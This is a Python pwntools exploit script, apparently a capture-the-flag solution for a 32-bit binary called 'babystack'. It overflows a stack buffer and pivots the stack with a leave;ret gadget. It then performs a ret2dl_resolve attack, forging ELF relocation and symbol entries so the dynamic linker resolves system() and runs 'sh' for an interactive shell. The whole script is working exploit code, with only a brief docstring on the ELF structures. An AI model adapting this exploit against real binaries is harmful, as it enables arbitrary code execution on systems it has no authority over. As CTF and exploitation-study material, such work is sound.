#!/usr/bin/python3.6

from pwn import *
from pwnlib.util.fiddling import hexdump
from pprint import pprint

program = 'babystack'
context.binary = program

# symtab table holds symbol information (each entry is Elf32_Sym and size 16 bytes)
# strtab string table of symbol names
# jmprel corresponds to .rel.plt stores relocation table (with offset/r_info/name)
# The ELF32_R_SYM(r_info) == 1 variable (which we got from the JMPREL table) gives the index of the Elf32_Sym in SYMTAB for the specified symbol.

"""
typedef struct 
{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel ; 

typedef struct {
        Elf32_Word      st_name;
        Elf32_Addr      st_value;
        Elf32_Word      st_size;
        unsigned char   st_info;
        unsigned char   st_other;
        Elf32_Half      st_shndx;
} Elf32_Sym;

typedef uint32_t Elf32_Addr ; 
typedef uint32_t Elf32_Word ; 

#define ELF32_R_SYM(val) ((val) >> 8) 
#define ELF32_R_TYPE(val) ((val) & 0xff)
_____

             +--------+
r_offset     |GOT     |  0x300     
r_info       |0x2100  |  0x304
alignment    |AAAAAAAA|  0x308
st_name      |0x120   |  0x310
st_value     |0x0     |
st_size      |0x0     |
others       |0x12    |
sym_string   |"syst   |  0x320
             |em\x00" |
             +--------+

// call of unresolved read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {
    Elf32_Rel * rel_entry = JMPREL + rel_offset ;
    Elf32_Sym * sym_entry = &SYMTAB [ ELF32_R_SYM ( rel_entry -> r_info )];
    char * sym_name = STRTAB + sym_entry -> st_name ;
    _search_for_symbol_(link_map, sym_name);
    // invoke initial read call now that symbol is resolved
    read(0, buf, 0x100);
}

"""

SYMTAB = 0x80481cc
STRTAB = 0x804822c
JMPREL = 0x80482b0
RESOLVER = 0x80482F0
BUFF = 0x804af00
LEAVE_RET_GADGET = 0x8048455

p = process(program)
e = ELF(program)

def stage1():
    # prepare for stage2 and pivot stack
    # rop read(0,*buff,0x80)
    payload = b""
    payload += b"A"*40
    payload += p32(BUFF) # saved ebp
    payload += p32(e.plt['read']) + p32(LEAVE_RET_GADGET)
    payload += p32(0x0) + p32(BUFF) + p32(0x80)
    
    return payload

def calc():
    # calculate offsets
    # prepare forged structures

    forged_ara = BUFF + 0x14
    r_offset = forged_ara - JMPREL
    elf32_sym = forged_ara + 0x8 #size of elf32_sym

    align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) #align to 0x10

    elf32_sym = elf32_sym + align
    index_sym = int((elf32_sym - SYMTAB) / 0x10)

    r_info = (index_sym << 8) | 0x7 

    elf32_rel = p32(e.got['read']) + p32(r_info)
    st_name = (elf32_sym + 0x10) - STRTAB
    elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

    return (r_offset, elf32_rel, elf32_sym_struct,align)


def stage2(pointers):
    r_offset, elf32_rel, elf32_sym_struct, align = pointers
    buffer2 = b'AAAA'                #fake ebp
    buffer2 += p32(RESOLVER)        # ret-to dl_resolve
    buffer2 += p32(r_offset)      #JMPRL + offset = struct
    buffer2 += b'AAAA'               #fake return 
    buffer2 += p32(BUFF+100)         # system parameter
    buffer2 += elf32_rel            # (buf+0x14)
    buffer2 += b'A' * align
    buffer2 += elf32_sym_struct     # (buf+0x20)
    buffer2 += b'system\x00'
    p = (100 - len(buffer2))
    buffer2 += b'A' * p              #padding
    buffer2 += b'sh\x00'
    p = (0x80 - len(buffer2))
    buffer2 += b'A' * p              #total read size
    
    return buffer2

stage1 = stage1()
pointers = calc()
stage2 = stage2(pointers)

rr = stage1+stage2

p.send(rr)
p.interactive()




